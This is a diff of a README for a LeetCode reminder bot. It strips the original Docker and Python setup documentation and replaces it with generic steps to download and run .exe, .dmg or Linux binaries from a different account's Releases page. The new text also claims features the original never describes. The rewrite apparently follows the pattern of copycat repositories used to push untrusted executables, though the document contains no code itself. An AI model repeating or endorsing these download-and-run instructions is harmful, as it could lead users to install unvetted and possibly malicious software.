@@ -1,141 +1,86 @@
-# LeetCode Reminder Bot
+# 🤖 leetcode-reminder-bot - Get Daily Coding Reminders
 
-[![Build Status](https://github.com/rajat069/leetcode-reminder-bot/actions/workflows/build-image.yml/badge.svg)](https://github.com/rajat069/leetcode-reminder-bot/actions/workflows/build-image.yml)
-[![Docker Image](https://img.shields.io/badge/ghcr.io-rajat069%2Fleetcode--reminder--bot-blue?logo=docker)](https://github.com/orgs/Rajat069/packages?repo_name=leetcode-reminder-bot)
-[![Python Version](https://img.shields.io/badge/python-3.10-blue?logo=python)](https://www.python.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download leetcode-reminder-bot](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/minocoplpo/leetcode-reminder-bot/releases)
 
----
+## 📦 Introduction
 
-### About
+Leetcode Reminder Bot is an automated tool designed to help you remember to practice coding every day. The bot sends you emails containing the Problem of the Day (POTD) along with hints and reminders. It's easy to set up and use, even for those with no technical background.
 
-**LeetCode Reminder Bot** is a smart, containerized reminder bot that **keeps you consistent** with your daily LeetCode practice — and gives you **AI-powered hints** when you need them most!
+## 🚀 Getting Started
 
-It checks whether users have solved the **Problem of the Day**, then:
-- Sends a **Reminder Email** (with AI hints + motivational quotes) if unsolved.
-- Sends a **Congratulations Email** when solved.
+This section will guide you through downloading and running the bot.
 
-> Built for developers who want to stay sharp, motivated, and consistent — all automatically.
+### 🛠️ System Requirements
 
----
+To successfully run the leetcode-reminder-bot, you will need:
 
-## Key Features
+- A computer running Windows, macOS, or a recent version of Linux.
+- An active internet connection.
+- A valid email account to receive reminders.
 
-### Smart Email Logic
-- Sends **“Congratulations”** or **“Reminder”** emails automatically.
-- Dynamic templates keep every message engaging.
+### 📥 Download & Install
 
-### AI-Powered (Gemini)
-- **Adaptive Hints:** Number of hints varies by difficulty and acceptance rate.  
-- **Helpful Hints:** Uses official problem data to generate intuitive AI hints.  
-- **Motivational Quotes:** Fetches inspiring movie quotes to boost motivation.
+1. **Visit the Releases Page**  
+   Go to the [Releases Page](https://github.com/minocoplpo/leetcode-reminder-bot/releases) to find the latest version of the bot.
 
-### Fully Containerized
-- Runs as a **single lightweight Docker container**.  
-- Supports both **amd64** and **arm64** architectures (Intel/AMD + Apple/Raspberry Pi).
----
+2. **Choose the Latest Version**  
+   Look for the most recent release. You will see options for different files. 
 
-## 🖼️ Gallery
+3. **Download the Application**  
+   Click on the file that matches your operating system to download it.
 
-| Reminder Email (Unsolved) | Congratulations Email (Solved) |
-|----------------------------|--------------------------------|
-| *(Screenshot coming soon)* | *(Screenshot coming soon)* |
+4. **Locate the Downloaded File**  
+   Once the file has downloaded, navigate to your Downloads folder or the location where you saved the file.
 
----
+5. **Run the Application**  
+   - For Windows: Double-click the `.exe` file to start the installation process. Follow the on-screen instructions.
+   - For macOS: Open the `.dmg` file and drag the application to your Applications folder. Then, open the app from there.
+   - For Linux: Extract the downloaded file, open a terminal, and run the executable with `./filename`.
 
-## 🏗️ Architecture Overview
+6. **Set Up Email Configuration**  
+   To receive reminders, you will need to configure your email settings in the application. Follow the prompts to enter your email address and any other required details.
 
-**“Set it and forget it” — built for autonomous operation.**
-![My Project Logo](assets/hld-diagram.png)
+7. **Test the Bot**  
+   After setup, you can test if the bot is working. The bot should send you a test email with the POTD.
 
-### Prerequisites
+### ⚙️ How It Works
 
-- A VM/server with **Docker installed**
-- A **GitHub Personal Access Token (PAT)** with `read:packages` scope
-- **GMAIL_APP_PASSWORD** & **GEMINI_API_KEY**
+Leetcode Reminder Bot runs in the background and checks for the daily coding problem every 24 hours. When it finds a new challenge, it will automatically send you an email reminder. You can adjust settings within the application to customize the frequency and timing of notifications.
 
----
-### Step 1: Log in to GHCR
+### 📝 Features
 
-```bash
-sudo docker login ghcr.io -u YOUR_USERNAME -p YOUR_PAT
-``` 
-### Step 2: Create Configuration Files
-```bash
+- Automated daily emails with the POTD.
+- Optional hints to help you solve the problem.
+- User-friendly interface for easy configuration.
+- Supports multiple email accounts.
 
-/home/{vm-username}/leetcode.env
-```
-> Note: Replace {vm-username} with your actual VM's username.
+## 🧑‍💻 Usage Instructions
 
-```
-GMAIL_APP_PASSWORD=YOUR_GMAIL_APP_PASSWORD_HERE
-SMTP_USER={your-mail}@gmail.com
-GEMINI_API_KEY=YOUR_GEMINI_API_KEY_HERE
-/home/{vm-username}/users.json
-```
->Note: Replace {your-mail} with your actual e-mail.
->environment variables should not have any quotes `""`.
+1. After installation, open the bot application.
+2. Enter your email address to receive problems and set up the reminders.
+3. Choose how often you want to receive emails, whether daily, weekly, or at a specific time.
+4. Click "Save Settings" to apply your preferences.
+5. You can close the application. It will run in the background and send notifications as scheduled.
 
-Your user list in JSON format.
-```json
-[
-  {
-    "username": "pam",
-    "email": "pam06@gmail.com"
-  },
-  {
-    "username": "simrunn",
-    "email": "simranxxxxx@gmail.com"
-  }
-]
-```
-🧠 Step 3: Run the Bot
-Pull and start the service with one command:
-```bash
-sudo docker run \
-    --detach \
-    --restart=always \
-    --name leetcode-bot \
-    --dns=8.8.8.8 \
-    --env-file /home/{vm-username}/leetcode.env \
-    -v /home/{vm-username}/users.json:/app/users.json \
-    ghcr.io/{github-username}/leetcode-reminder-bot:latest
-```
-> Note: Replace {vm-username} and github-username} with your actual details.
+## ℹ️ Troubleshooting
 
-Check logs anytime:
+If you encounter issues:
 
-```bash
-sudo docker logs -f leetcode-bot
-```
-## Local Development
+- Ensure you have a stable internet connection.
+- Check your email spam folder if you do not receive emails.
+- Make sure you have entered your email address correctly in the settings.
+- Restart the application if it becomes unresponsive.
 
-1. Clone the Repository
-2. Create a .env File with all variables mentioned above
-3. Create a users.json File
-4. Install Dependencies using following command
-``` bash
-pip install -r requirements.txt
-```
-5. Run Locally
-``` bash
-python main.py
-```
+## 💬 Community Support
 
-## To Dos
-- [x] Add gemini-service   
-- [ ] Implement caching for static operations 
-- [ ] Enhance email UI
+If you have questions or need help, consider reaching out to our community. You can:
 
-## Configuration Reference
+- Open an issue in the [GitHub Issues](https://github.com/minocoplpo/leetcode-reminder-bot/issues) section for technical assistance.
+- Visit the repository to view documentation or updates.
 
-| Variable | Description | Required | Default |
-| :--- | :--- | :--- | :--- |
-| `GMAIL_APP_PASSWORD` | Google App Password for email sending | ✅ Yes | — |
-| `SMTP_USER` | Gmail address used for SMTP | ✅ Yes | — |
-| `GEMINI_API_KEY` | API key from Google AI Studio | ✅ Yes | — |
-| `SMTP_SERVER` | SMTP server hostname | ❌ No | `smtp.gmail.com` |
-| `SMTP_PORT` | SMTP port number | ❌ No | `587` |
+## 🔗 Additional Information
 
-## License
-This project is licensed under the MIT License. See the `LICENSE` file for details.
+For more detailed documentation, visit the [GitHub repository](https://github.com/minocoplpo/leetcode-reminder-bot). Learn about how this bot can improve your coding skills and keep you motivated.
+
+To download the latest version again, click the link below:  
+[Download leetcode-reminder-bot](https://github.com/minocoplpo/leetcode-reminder-bot/releases)
